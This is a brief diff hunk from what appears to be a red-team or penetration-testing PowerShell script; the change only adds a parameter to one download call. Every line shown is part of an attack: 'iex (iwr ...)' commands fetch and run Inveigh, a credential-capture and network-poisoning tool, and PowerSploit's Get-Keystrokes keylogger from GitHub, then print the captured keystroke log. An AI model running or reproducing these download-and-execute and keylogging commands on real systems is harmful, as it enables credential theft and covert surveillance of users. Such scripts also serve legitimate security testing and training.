@@ -12,7 +12,7 @@ iex( iwr https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveig
 Invoke-Inveigh
 
 ############# user context ok
-iex (iwr https://raw.githubusercontent.com/clr2of8/PowerSploit/master/Exfiltration/Get-Keystrokes.ps1)
+iex (iwr https://raw.githubusercontent.com/clr2of8/PowerSploit/master/Exfiltration/Get-Keystrokes.ps1 -usebasicparsing)
 Get-Keystrokes
 cat $env:temp\key.log
 
